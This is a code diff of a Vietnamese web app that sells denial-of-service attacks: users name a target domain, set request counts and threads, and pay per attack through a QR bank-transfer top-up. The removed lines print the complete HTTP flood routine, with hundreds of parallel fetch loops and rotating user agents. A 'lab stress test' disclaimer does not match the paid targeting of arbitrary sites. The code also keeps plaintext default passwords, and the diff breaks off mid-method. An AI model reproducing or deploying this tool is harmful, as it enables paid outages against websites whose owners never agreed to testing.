@@ -188,7 +188,6 @@
         .error-msg.show {
             display: block;
         }
-        /* Balance */
         .balance-display {
             background: #eff6ff;
             border: 1.5px solid #bfdbfe;
@@ -218,7 +217,6 @@
             color: #2563eb;
             font-size: 28px;
         }
-        /* Bottom Menu */
         .bottom-menu {
             display: flex;
             justify-content: space-around;
@@ -335,33 +333,148 @@
             display: flex;
             align-items: center;
             gap: 10px;
+            cursor: pointer;
         }
         .top-bar .avatar {
-            width: 36px;
-            height: 36px;
-            background: #bfdbfe;
+            width: 40px;
+            height: 40px;
             border-radius: 50% !important;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #1e3a8a;
+            background: #bfdbfe;
+            overflow: hidden;
+            flex-shrink: 0;
+            border: 2px solid #bfdbfe;
+            transition: .2s;
+            position: relative;
+        }
+        .top-bar .avatar:hover {
+            border-color: #2563eb;
+        }
+        .top-bar .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .top-bar .avatar .default-icon {
+            font-size: 20px;
         }
         .top-bar .username {
             font-weight: 700;
             font-size: 14px;
             color: #1a2332;
         }
+        .qr-code {
+            text-align: center;
+            padding: 10px;
+            background: #f8fafc;
+            border-radius: 8px !important;
+            border: 1px dashed #bfdbfe;
+        }
+        .qr-code img {
+            max-width: 200px;
+            width: 100%;
+            border-radius: 8px !important;
+        }
+        .status-badge {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px !important;
+        }
+        .status-duyet { background: #fef3c7; color: #92400e; }
+        .status-ddos { background: #dbeafe; color: #1e40af; }
+        .status-thanhcong { background: #d1fae5; color: #065f46; }
+        .avatar-upload-btn {
+            background: #eff6ff;
+            border: 1px dashed #bfdbfe;
+            padding: 4px 12px;
+            border-radius: 20px !important;
+            font-size: 11px;
+            color: #2563eb;
+            cursor: pointer;
+            transition: .2s;
+        }
+        .avatar-upload-btn:hover {
+            background: #dbeafe;
+        }
+        .forgot-password-form {
+            display: none;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1.5px solid #e2e8f0;
+        }
+        .forgot-password-form.show {
+            display: block;
+        }
+        .forgot-password-form .btn-send-code {
+            width: 100%;
+            padding: 12px;
+            background: #16a34a;
+            color: #fff;
+            border: none;
+            border-radius: 8px !important;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: .2s;
+            margin-top: 8px;
+        }
+        .forgot-password-form .btn-send-code:hover {
+            background: #15803d;
+        }
+        .forgot-password-form .btn-verify-code {
+            width: 100%;
+            padding: 12px;
+            background: #2563eb;
+            color: #fff;
+            border: none;
+            border-radius: 8px !important;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: .2s;
+            margin-top: 8px;
+        }
+        .forgot-password-form .btn-verify-code:hover {
+            background: #1d4ed8;
+        }
+        .back-to-login-forgot {
+            color: #64748b;
+            font-size: 13px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .back-to-login-forgot span {
+            color: #2563eb;
+            font-weight: 600;
+        }
+        .back-to-login-forgot span:hover {
+            text-decoration: underline;
+        }
+        /* Intro Avatar */
+        .intro-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50% !important;
+            object-fit: cover;
+            border: 4px solid #bfdbfe;
+            display: block;
+            margin: 0 auto 16px auto;
+        }
     </style>
 </head>
 <body>
 <div id="app">
-    <!-- ===== LOGIN ===== -->
+    <!-- ===== LOGIN / REGISTER / FORGOT ===== -->
     <div v-if="!currentUser" class="login-container">
         <div class="login-card">
-            <div class="login-title">Đăng Nhập</div>
-            <div class="login-subtitle">Vui lòng nhập thông tin đăng nhập</div>
-
-            <div id="loginForm">
+            <!-- Form đăng nhập -->
+            <div v-if="!showRegisterOnly && !showForgotPassword">
+                <div class="login-title">Đăng Nhập</div>
+                <div class="login-subtitle">Vui lòng nhập thông tin đăng nhập</div>
                 <div class="form-group">
                     <label>Username</label>
                     <input v-model="loginUser" type="text" placeholder="Vui lòng nhập username" />
@@ -372,27 +485,67 @@
                 </div>
                 <div class="error-msg" :class="{show: loginError}">{{ loginError }}</div>
                 <button class="btn-login" @click="login">ĐĂNG NHẬP</button>
-
                 <hr class="divider" />
-
                 <div class="bottom-links">
-                    <span class="forgot-link" @click="forgotPassword">Quên mật khẩu?</span>
-                    <span class="register-link" @click="showRegister = !showRegister">Đăng Ký Ngay</span>
+                    <span class="forgot-link" @click="showForgotPassword = true">Quên mật khẩu?</span>
+                    <span class="register-link" @click="showRegisterOnly = true">Đăng Ký Ngay</span>
                 </div>
             </div>
 
-            <div class="register-form" :class="{show: showRegister}">
+            <!-- Form đăng ký -->
+            <div v-else-if="showRegisterOnly">
+                <div class="login-title">Đăng Ký</div>
+                <div class="login-subtitle">Tạo tài khoản mới</div>
                 <div class="form-group">
                     <label>Username</label>
                     <input v-model="regUser" type="text" placeholder="Chọn tên đăng nhập" />
+                </div>
+                <div class="form-group">
+                    <label>Email</label>
+                    <input v-model="regEmail" type="email" placeholder="Nhập email của bạn" />
                 </div>
                 <div class="form-group">
                     <label>Mật khẩu</label>
                     <input v-model="regPass" type="password" placeholder="Nhập mật khẩu" />
                 </div>
                 <button class="btn-register" @click="register">ĐĂNG KÝ</button>
-                <div class="back-to-login" @click="showRegister = false">
+                <div class="back-to-login" @click="showRegisterOnly = false">
                     ← <span>Quay lại đăng nhập</span>
+                </div>
+            </div>
+
+            <!-- Form quên mật khẩu -->
+            <div v-else-if="showForgotPassword">
+                <div class="login-title">Quên Mật Khẩu</div>
+                <div class="login-subtitle">Nhập email để lấy lại mật khẩu</div>
+                
+                <div v-if="!forgotStep2">
+                    <div class="form-group">
+                        <label>Email đã đăng ký</label>
+                        <input v-model="forgotEmail" type="email" placeholder="Nhập email của bạn" />
+                    </div>
+                    <button class="btn-send-code" @click="sendResetCode">Gửi mã xác nhận</button>
+                    <div class="back-to-login-forgot" @click="showForgotPassword = false">
+                        ← <span>Quay lại đăng nhập</span>
+                    </div>
+                </div>
+
+                <div v-else>
+                    <div class="alert alert-info text-center" style="border-radius:8px!important;font-size:13px;">
+                        <i class="bi bi-envelope"></i> Mã xác nhận đã gửi đến email của bạn
+                    </div>
+                    <div class="form-group">
+                        <label>Nhập mã xác nhận</label>
+                        <input v-model="resetCode" type="text" placeholder="Nhập mã 6 số" maxlength="6" />
+                    </div>
+                    <div class="form-group">
+                        <label>Mật khẩu mới</label>
+                        <input v-model="newPassword" type="password" placeholder="Nhập mật khẩu mới" />
+                    </div>
+                    <button class="btn-verify-code" @click="verifyResetCode">Xác nhận & Đổi mật khẩu</button>
+                    <div class="back-to-login-forgot" @click="showForgotPassword = false; forgotStep2 = false">
+                        ← <span>Quay lại đăng nhập</span>
+                    </div>
                 </div>
             </div>
 
@@ -402,21 +555,28 @@
         </div>
     </div>
 
-    <!-- ===== MAIN APP - CHỈ HIỆN KHI ĐĂNG NHẬP ===== -->
+    <!-- ===== MAIN APP ===== -->
     <div v-else class="login-container" style="max-width:480px;">
         <!-- Top Bar -->
         <div class="top-bar">
-            <div class="user-info">
-                <div class="avatar"><i class="bi bi-person-fill"></i></div>
+            <div class="user-info" @click="triggerAvatarUpload">
+                <div class="avatar">
+                    <img v-if="currentUser.avatar" :src="currentUser.avatar" alt="Avatar" />
+                    <i v-else class="bi bi-person-fill default-icon"></i>
+                </div>
                 <div>
                     <div class="username">{{currentUser.username}}</div>
                     <span class="badge" :class="{'bg-primary':currentUser.role==='admin','bg-success':currentUser.role==='vip','bg-secondary':currentUser.role==='user'}" style="font-size:9px;">{{currentUser.role}}</span>
                 </div>
+                <input type="file" ref="avatarInput" @change="uploadAvatar" accept="image/*" style="display:none;" />
+                <span class="avatar-upload-btn ms-2" @click.stop="triggerAvatarUpload">
+                    <i class="bi bi-camera"></i> Đổi ảnh
+                </span>
             </div>
             <button class="btn btn-sm btn-outline-danger" @click="logout" style="padding:4px 10px;font-size:12px;"><i class="bi bi-box-arrow-right"></i> Đăng xuất</button>
         </div>
 
-        <!-- Hiển thị số dư -->
+        <!-- Số dư -->
         <div class="balance-display">
             <span class="label"><i class="bi bi-wallet2 text-primary"></i> Số dư:</span>
             <span class="amount">
@@ -429,61 +589,54 @@
             </span>
         </div>
 
-        <!-- ===== BOTTOM MENU ===== -->
+        <!-- Menu -->
         <div class="bottom-menu">
             <button class="menu-item" :class="{active: activeMenu==='ddos'}" @click="activeMenu='ddos'">
-                <i class="bi bi-hurricane"></i>
-                <span>DDoS</span>
+                <i class="bi bi-hurricane"></i><span>DDoS</span>
             </button>
             <button class="menu-item" :class="{active: activeMenu==='nap'}" @click="activeMenu='nap'">
-                <i class="bi bi-credit-card"></i>
-                <span>Nạp Tiền</span>
+                <i class="bi bi-credit-card"></i><span>Nạp Tiền</span>
             </button>
-            <button class="menu-item" :class="{active: activeMenu==='logs'}" @click="activeMenu='logs'">
-                <i class="bi bi-clock"></i>
-                <span>Lịch sử</span>
+            <button class="menu-item" :class="{active: activeMenu==='lichsu'}" @click="activeMenu='lichsu'">
+                <i class="bi bi-clock"></i><span>Lịch sử</span>
             </button>
             <button class="menu-item" :class="{active: activeMenu==='info'}" @click="activeMenu='info'">
-                <i class="bi bi-info-circle"></i>
-                <span>Thông tin</span>
+                <i class="bi bi-info-circle"></i><span>Giới Thiệu</span>
             </button>
         </div>
 
-        <!-- ===== NỘI DUNG CÁC CHỨC NĂNG ===== -->
-        <!-- Chỉ hiện 1 chức năng khi được bấm vào -->
-
-        <!-- DDoS -->
+        <!-- ===== DDoS ===== -->
         <div v-show="activeMenu==='ddos'" class="card-content mt-3">
             <h6><i class="bi bi-hurricane text-primary"></i> DDoS Web</h6>
             <div class="form-group">
                 <label>Tên miền</label>
-                <input v-model="targetUrl" class="form-control" placeholder="nhập tên miền (vd: ancd.com)" style="border-radius:8px!important;background:#f8fafc;" />
+                <input v-model="targetUrl" class="form-control" placeholder="nhập tên miền (vd: ancd.com)" />
             </div>
             <div class="form-group">
                 <label>Số lần DDoS <small class="text-secondary" v-if="!isAdmin">(tối đa 1000)</small></label>
-                <input v-model.number="maxRequests" type="number" class="form-control" :max="isAdmin ? 999999 : 1000" placeholder="100" style="border-radius:8px!important;background:#f8fafc;" />
+                <input v-model.number="maxRequests" type="number" class="form-control" :max="isAdmin ? 999999 : 1000" placeholder="100" />
                 <small class="text-primary" v-if="isAdmin">* Admin không giới hạn</small>
             </div>
             <div class="row g-2">
                 <div class="col-6">
                     <label>Luồng</label>
-                    <input v-model.number="threads" type="number" class="form-control" value="80" min="1" max="500" style="border-radius:8px!important;background:#f8fafc;" />
+                    <input v-model.number="threads" type="number" class="form-control" value="80" min="1" max="500" />
                 </div>
                 <div class="col-6">
                     <label>Method</label>
                     <select v-model="method" class="form-select"><option>GET</option><option>POST</option></select>
                 </div>
             </div>
-            <button class="btn-ddos" @click="startDDoS" :disabled="isRunning || (currentUser.balance < 5000 && currentUser.balance !== Infinity && currentUser.balance !== 'vô hạn')">
-                <i class="bi bi-play-circle"></i> {{ isRunning ? 'ĐANG TẤN CÔNG...' : 'TẤN CÔNG (5,000₫)' }}
+            <button class="btn-ddos" @click="startDDoS" :disabled="isRunning || (currentUser.balance < 500 && currentUser.balance !== Infinity && currentUser.balance !== 'vô hạn')">
+                <i class="bi bi-play-circle"></i> {{ isRunning ? 'ĐANG TẤN CÔNG...' : 'TẤN CÔNG (500₫)' }}
             </button>
             <div class="d-flex justify-content-between mt-2">
                 <span class="badge bg-light text-dark p-2">📊 {{ statusText }}</span>
                 <span class="badge bg-light text-dark p-2">📤 {{ totalRequests }}</span>
                 <span class="badge bg-light text-dark p-2">⚡ {{ currentRPS }} RPS</span>
             </div>
-            <div v-if="currentUser.balance < 5000 && currentUser.balance !== Infinity && currentUser.balance !== 'vô hạn'" class="mt-2 small text-warning text-center">
-                <i class="bi bi-exclamation-triangle"></i> Số dư không đủ 5,000₫
+            <div v-if="currentUser.balance < 500 && currentUser.balance !== Infinity && currentUser.balance !== 'vô hạn'" class="mt-2 small text-warning text-center">
+                <i class="bi bi-exclamation-triangle"></i> Số dư không đủ 500₫
             </div>
             <div v-if="currentUser.balance === Infinity || currentUser.balance === 'vô hạn'" class="mt-2 small text-success text-center">
                 <i class="bi bi-infinity"></i> VIP - Số dư vô hạn!
@@ -498,27 +651,40 @@
                 <div v-show="showLog" class="log-area mt-2">
                     <div v-for="line in logLines" :key="line.id" :class="line.type" style="white-space:pre-wrap;">{{ line.msg }}</div>
                 </div>
-                <div v-if="showDone" class="mt-2 alert alert-success text-center fw-bold py-1" style="font-size:13px;border-radius:8px!important;">
-                    ✅ ĐÃ XONG! 
-                </div>
             </div>
         </div>
 
-        <!-- Nạp tiền -->
+        <!-- ===== Nạp tiền ===== -->
         <div v-show="activeMenu==='nap'" class="card-content mt-3">
             <h6 class="text-center"><i class="bi bi-credit-card-fill text-primary"></i> Nạp tiền</h6>
             <div v-if="currentUser.balance === Infinity || currentUser.balance === 'vô hạn'" class="alert alert-success text-center" style="border-radius:8px!important;">
                 <i class="bi bi-infinity"></i> Tài khoản đã có số dư vô hạn!
             </div>
             <div v-else>
-                <div class="input-group mb-2">
-                    <span class="input-group-text" style="background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:8px 0 0 8px!important;">₫</span>
-                    <input v-model.number="napAmount" type="number" class="form-control" min="5000" placeholder="5000" style="border-radius:0 8px 8px 0!important;background:#f8fafc;" />
+                <!-- QR Code -->
+                <div class="qr-code mb-3">
+                    <img src="https://cdn.upanhlaylink.com/i/jqhHBlUR.jpeg" alt="QR Code" />
+                    <p class="text-secondary small mt-2">Quét mã QR để chuyển khoản</p>
                 </div>
-                <div class="alert alert-warning py-2 text-center" style="font-size:12px;border-radius:8px!important;">
-                    <i class="bi bi-exclamation-triangle"></i> Cảnh báo: Chuyển dưới 5,000₫ sẽ không được hoàn trả và tự chịu rủi ro!
+                
+                <div class="form-group">
+                    <label>Số tiền nạp</label>
+                    <div class="input-group">
+                        <span class="input-group-text" style="background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:8px 0 0 8px!important;">₫</span>
+                        <input v-model.number="napAmount" type="number" class="form-control" min="5000" placeholder="5000" style="border-radius:0 8px 8px 0!important;" />
+                    </div>
                 </div>
-                <button class="btn-success-custom" @click="napTien">Nạp tiền</button>
+
+                <div class="form-group">
+                    <label>Ghi chú chuyển khoản (bắt buộc)</label>
+                    <input v-model="napNote" class="form-control" placeholder="Nhập đúng nội dung ghi chú" />
+                    <small class="text-primary">* Ghi chú của bạn: <strong>{{napNote || 'chưa nhập'}}</strong></small>
+                </div>
+
+                <button class="btn-success-custom" @click="napTien">Xác nhận nạp tiền</button>
+                <div class="mt-2 text-center text-secondary" style="font-size:12px;">
+                    <i class="bi bi-info-circle"></i> Sau khi chuyển khoản, nhập đúng ghi chú để hệ thống tự động cộng tiền
+                </div>
             </div>
             <div class="mt-2 text-center text-secondary" style="font-size:13px;">
                 Số dư hiện tại: 
@@ -527,29 +693,41 @@
             </div>
         </div>
 
-        <!-- Lịch sử -->
-        <div v-show="activeMenu==='logs'" class="card-content mt-3">
-            <h6><i class="bi bi-clock text-primary"></i> Lịch sử tấn công</h6>
-            <div style="max-height:300px;overflow-y:auto;font-size:13px;">
-                <div v-for="log in attackLogs.slice().reverse()" :key="log.id" class="border-bottom py-2 d-flex justify-content-between">
-                    <span><i class="bi bi-link-45deg"></i> {{log.target}}</span>
-                    <span class="text-secondary">{{log.requests}} req</span>
+        <!-- ===== Lịch sử ===== -->
+        <div v-show="activeMenu==='lichsu'" class="card-content mt-3">
+            <h6><i class="bi bi-clock text-primary"></i> Lịch sử</h6>
+            <div style="max-height:400px;overflow-y:auto;font-size:13px;">
+                <div v-for="item in historyItems.slice().reverse()" :key="item.id" class="border-bottom py-2">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <div>
+                            <span><i class="bi bi-link-45deg"></i> {{item.target}}</span>
+                            <span class="badge ms-2" :class="{'status-duyet':item.status==='Đang duyệt','status-ddos':item.status==='Đang DDoS','status-thanhcong':item.status==='Thành công'}">
+                                {{item.status}}
+                            </span>
+                        </div>
+                        <span class="text-secondary small">{{item.requests || 0}} req</span>
+                    </div>
+                    <div class="text-secondary small">
+                        <i class="bi bi-clock"></i> {{item.time}} 
+                        <span v-if="item.amount" class="ms-2">- {{item.amount}}₫</span>
+                    </div>
                 </div>
-                <div v-if="!attackLogs.length" class="text-center text-secondary py-3">Chưa có lịch sử</div>
+                <div v-if="!historyItems.length" class="text-center text-secondary py-3">Chưa có lịch sử</div>
             </div>
         </div>
 
-        <!-- Thông tin -->
+        <!-- ===== Giới Thiệu ===== -->
         <div v-show="activeMenu==='info'" class="card-content mt-3">
-            <h5 class="text-center fw-bold"><i class="bi bi-info-circle text-primary"></i> Thông tin</h5>
+            <h5 class="text-center fw-bold"><i class="bi bi-info-circle text-primary"></i> Giới Thiệu</h5>
             <hr />
-            <p><strong>Chủ sở hữu:</strong> <span class="text-primary fw-bold">Đỗ Quốc Nam</span></p>
+            <img src="https://cdn.upanhlaylink.com/i/eqCaUShn.jpeg" alt="Avatar" class="intro-avatar" />
+            <p class="text-center"><strong>Chủ sở hữu:</strong> <span class="text-primary fw-bold">Đỗ Quốc Nam</span></p>
             <p><strong>Web ra đời:</strong> Từ năm 2024 với mục đích cung cấp công cụ kiểm tra stress test cho các hệ thống trong môi trường Lab.</p>
             <p><strong>Sứ mệnh:</strong> Hỗ trợ các kỹ sư bảo mật và quản trị viên hệ thống kiểm tra khả năng chịu tải của website.</p>
             <p><strong>Cam kết:</strong> Sử dụng đúng mục đích học tập và nghiên cứu, không sử dụng cho mục đích tấn công trái phép.</p>
             <div class="text-center mt-3">
                 <span class="badge bg-secondary">Version 3.0</span>
-                <span class="badge bg-primary">© 2024 Đỗ Quốc Nam</span>
+                <span class="badge bg-primary">© 2026 Đỗ Quốc Nam</span>
             </div>
         </div>
     </div>
@@ -563,9 +741,14 @@ new Vue({
         currentUser: null,
         users: [],
         loginUser: '', loginPass: '',
-        regUser: '', regPass: '',
+        regUser: '', regPass: '', regEmail: '',
         loginError: '',
-        showRegister: false,
+        showRegisterOnly: false,
+        showForgotPassword: false,
+        forgotStep2: false,
+        forgotEmail: '',
+        resetCode: '',
+        newPassword: '',
         activeMenu: 'ddos',
         showLog: true,
         targetUrl: '',
@@ -581,7 +764,9 @@ new Vue({
         stopFlag: false,
         logId: 0,
         napAmount: 5000,
+        napNote: '',
         attackLogs: [],
+        historyItems: [],
         timerRPS: null,
         currentAttackCount: 0
     },
@@ -595,191 +780,37 @@ new Vue({
         initData() {
             if(!localStorage.getItem('ddos_users')) {
                 const defaultUsers = [
-                    { id:1, username:'admin', password:'12345', role:'admin', balance: Infinity },
-                    { id:2, username:'user', password:'123', role:'user', balance: 20000 },
-                    { id:3, username:'vip', password:'vip', role:'vip', balance: 100000 }
+                    { id:1, username:'admin', password:'12345', role:'admin', balance: Infinity, avatar: null, email: 'admin@demo.com' },
+                    { id:2, username:'user', password:'123', role:'user', balance: 20000, avatar: null, email: 'user@demo.com' },
+                    { id:3, username:'vip', password:'vip', role:'vip', balance: 100000, avatar: null, email: 'vip@demo.com' }
                 ];
                 localStorage.setItem('ddos_users', JSON.stringify(defaultUsers));
             }
             this.users = JSON.parse(localStorage.getItem('ddos_users'));
             this.attackLogs = JSON.parse(localStorage.getItem('ddos_attack_logs')) || [];
+            this.historyItems = JSON.parse(localStorage.getItem('ddos_history')) || [];
         },
         saveUsers() { localStorage.setItem('ddos_users', JSON.stringify(this.users)); },
         saveLogs() { localStorage.setItem('ddos_attack_logs', JSON.stringify(this.attackLogs)); },
-        login() {
-            this.loginError = '';
-            const found = this.users.find(u => u.username===this.loginUser && u.password===this.loginPass);
-            if(found) { 
-                this.currentUser = found; 
-                this.activeMenu='ddos';
-                this.addLog('✅ Đăng nhập thành công', 'sent');
-                this.showRegister = false;
-                this.loginUser = '';
-                this.loginPass = '';
-            } else {
-                this.loginError = 'Sai tên đăng nhập hoặc mật khẩu';
-            }
+        saveHistory() { localStorage.setItem('ddos_history', JSON.stringify(this.historyItems)); },
+        triggerAvatarUpload() {
+            this.$refs.avatarInput.click();
         },
-        register() {
-            if(!this.regUser || !this.regPass) return alert('Nhập đủ thông tin');
-            if(this.users.find(u=>u.username===this.regUser)) return alert('Tên đã tồn tại');
-            this.users.push({ id: Date.now(), username: this.regUser, password: this.regPass, role: 'user', balance: 0 });
-            this.saveUsers();
-            alert('Đăng ký thành công! Vui lòng đăng nhập.');
-            this.regUser = '';
-            this.regPass = '';
-            this.showRegister = false;
-        },
-        forgotPassword() {
-            alert('Vui lòng liên hệ admin để lấy lại mật khẩu.');
-        },
-        logout() { 
-            this.currentUser = null; 
-            this.stopFlag = true; 
-            this.isRunning = false;
-            this.showRegister = false;
-        },
-        napTien() {
-            if(this.napAmount < 5000) return alert('Tối thiểu 5,000₫');
-            const user = this.users.find(u => u.id === this.currentUser.id);
-            if(user) {
-                user.balance = (user.balance || 0) + this.napAmount;
-                this.currentUser.balance = user.balance;
-                this.saveUsers();
-                this.addLog(`💰 Nạp ${this.formatCurrency(this.napAmount)}₫ thành công`, 'sent');
-                this.napAmount = 5000;
-            }
-        },
-        addLog(msg, type='') {
-            this.logLines.push({ id: this.logId++, msg, type });
-            this.$nextTick(() => {
-                const el = document.querySelector('.log-area');
-                if(el) el.scrollTop = el.scrollHeight;
-            });
-        },
-        clearLog() { this.logLines = []; this.showDone = false; this.totalRequests = 0; },
-        async startDDoS() {
-            if(this.isRunning) return;
-            if(!this.targetUrl.trim()) return alert('Nhập tên miền');
-            
-            let url = this.targetUrl.trim();
-            if(!url.startsWith('http://') && !url.startsWith('https://')) {
-                url = 'http://' + url;
-            }
-            
-            const maxLimit = this.isAdmin ? 999999 : 1000;
-            if(this.maxRequests > maxLimit) {
-                alert(this.isAdmin ? 'Admin không giới hạn' : 'Số lần tối đa là 1000');
-                return;
-            }
-            
-            const user = this.users.find(u => u.id === this.currentUser.id);
-            if(user && user.balance !== Infinity && user.balance !== 'vô hạn') {
-                if(user.balance < 5000) return alert('Số dư không đủ');
-                user.balance -= 5000;
-                this.currentUser.balance = user.balance;
-                this.saveUsers();
-            }
-
-            this.showDone = false; 
-            this.stopFlag = false; 
-            this.isRunning = true;
-            this.statusText = 'ĐANG TẤN CÔNG...'; 
-            this.totalRequests = 0; 
-            this.currentRPS = 0;
-            this.currentAttackCount = 0;
-
-            const targetUrl = url;
-            const maxRequests = this.maxRequests;
-            const threads = Math.min(500, Math.max(1, this.threads));
-            const method = this.method;
-            
-            this.addLog(`🔥 Bắt đầu DDoS ${targetUrl} | ${maxRequests} lần, ${threads} luồng`, 'sent');
-
-            const uas = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) AppleWebKit/605.1.15'
-            ];
-
-            let requestCount = 0;
-            if(this.timerRPS) clearInterval(this.timerRPS);
-            this.timerRPS = setInterval(() => { 
-                this.currentRPS = Math.round(requestCount/2); 
-                requestCount = 0; 
-            }, 2000);
-
-            const sendRequest = async () => {
-                while (!this.stopFlag && this.currentAttackCount < maxRequests) {
-                    try {
-                        const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 1500);
-                        const opts = {
-                            method, 
-                            headers: { 
-                                'User-Agent': uas[Math.floor(Math.random()*uas.length)], 
-                                'Cache-Control': 'no-cache' 
-                            },
-                            signal: controller.signal, 
-                            mode: 'no-cors'
-                        };
-                        if(method === 'POST') { 
-                            opts.body = 'x='+Math.random(); 
-                            opts.headers['Content-Type'] = 'application/x-www-form-urlencoded'; 
-                        }
-                        await fetch(targetUrl, opts);
-                        clearTimeout(timeout);
-                        this.totalRequests++; 
-                        this.currentAttackCount++;
-                        requestCount++;
-                        if(this.currentAttackCount % 50 === 0) {
-                            this.addLog(`📤 Đã gửi ${this.currentAttackCount}/${maxRequests}`, '');
-                        }
-                    } catch(e) {
-                        this.totalRequests++; 
-                        this.currentAttackCount++;
-                        requestCount++;
-                        if(this.currentAttackCount % 100 === 0) {
-                            this.addLog(`⚠️ Lỗi: ${e.message || 'timeout'}`, 'fail');
-                        }
-                    }
+        uploadAvatar(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const avatarData = e.target.result;
+                const user = this.users.find(u => u.id === this.currentUser.id);
+                if (user) {
+                    user.avatar = avatarData;
+                    this.currentUser.avatar = avatarData;
+                    this.saveUsers();
+                    this.addLog('🖼️ Đã cập nhật ảnh đại diện', 'sent');
                 }
             };
-
-            const workers = [];
-            for(let i=0; i<threads; i++) {
-                workers.push(sendRequest());
-            }
-            await Promise.all(workers);
-
-            clearInterval(this.timerRPS); 
-            this.currentRPS = 0;
-            
-            this.attackLogs.push({ 
-                id: Date.now(), 
-                target: targetUrl, 
-                requests: this.currentAttackCount, 
-                duration: Math.round(this.currentAttackCount / (this.threads || 1)),
-                time: new Date().toLocaleString() 
-            });
-            this.saveLogs();
-
-            if(!this.stopFlag) {
-                this.showDone = true; 
-                this.statusText = 'ĐÃ HOÀN THÀNH';
-                this.addLog(`✅ ĐÃ XONG! Tổng: ${this.currentAttackCount} request`, 'sent');
-            } else {
-                this.statusText = 'ĐÃ DỪNG';
-                this.addLog(`⏹️ Dừng. Tổng: ${this.currentAttackCount}`, 'fail');
-            }
-            this.isRunning = false;
-        }
-    },
-    mounted() { 
-        this.initData();
-    }
-});
-</script>
-</body>
-</html>
+            reader.readAsDataURL(file);
+            this.$refs.avatarInput.value = '';
+        },
+        login
